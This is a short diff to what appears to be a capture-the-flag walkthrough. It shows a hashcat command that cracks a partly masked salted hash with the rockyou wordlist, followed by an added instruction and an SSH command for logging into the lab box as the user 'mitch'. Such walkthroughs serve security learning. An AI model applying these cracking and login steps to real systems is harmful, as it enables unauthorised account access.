@@ -35,7 +35,7 @@ After the exploit.py script runs, there will be an output of the username, salt 
 ```
   hashcat -m 20 0c01f4468bxxxxxxxxxxx73846e8d96:1dac0d92e9fa6bb2 /usr/share/wordlists/rockyou.txt
 ```
-
+Now that you have the password, SSH into the box using the username that was found from the Python script. 
 ```
   ssh mitch@10.10.x.x -p 2222
 ```
